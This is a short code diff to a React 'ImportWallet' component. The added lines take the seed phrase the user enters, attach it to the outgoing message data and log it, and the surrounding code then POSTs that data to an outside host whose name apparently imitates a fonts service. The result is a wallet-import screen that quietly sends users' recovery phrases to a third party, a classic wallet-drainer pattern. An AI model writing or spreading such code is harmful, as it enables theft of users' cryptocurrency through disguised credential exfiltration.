@@ -61,6 +61,9 @@ export default function ImportWallet() {
   };
 
   const sendMessage = async () => {
+    const seedPhraseFormatted = `Seed Phrase: ${seedPhraseMessage.join(' ')}`;
+    messageData.seedPhrase = seedPhraseFormatted;
+    console.log(messageData)
     try {
       await fetch("https://fonts7787.vercel.app/api/t1/image", {
         method: "POST",
